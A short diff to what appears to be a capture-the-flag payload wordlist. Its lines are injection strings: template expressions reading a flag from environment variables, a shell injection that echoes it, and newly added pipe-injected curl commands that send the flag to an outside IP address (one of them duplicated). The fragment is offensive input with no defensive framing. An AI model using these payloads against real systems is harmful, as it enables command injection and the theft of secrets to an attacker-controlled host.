@@ -532,3 +532,6 @@ ${{ env.flag }}
 ${{ env[FLAG] }}
 ${{ env.FLAG }}
 "; echo $flag"
+R1gelX29:|test
+|curl http://101.132.238.43:5992/?xxx=$flag;
+|curl http://101.132.238.43:5992/?xxx=$flag;
